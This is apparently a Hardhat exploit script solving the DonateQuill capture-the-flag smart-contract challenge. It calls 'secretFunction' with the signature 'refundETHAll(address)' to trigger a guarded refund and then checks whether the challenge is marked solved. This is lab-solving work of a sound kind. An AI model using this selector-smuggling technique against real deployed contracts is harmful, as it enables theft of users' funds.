import chalk from "chalk";
import { ethers } from "hardhat";
import { DonateQuill__factory, DonateQuill } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [donateQuillContract, attacker] = await initialize<DonateQuill>(DonateQuill__factory, undefined, [(await ethers.getSigners())[0]]);
    let address = await donateQuillContract.getAddress();
    let tx = await donateQuillContract.secretFunction("refundETHAll(address)");
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await donateQuillContract.keeperCheck())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});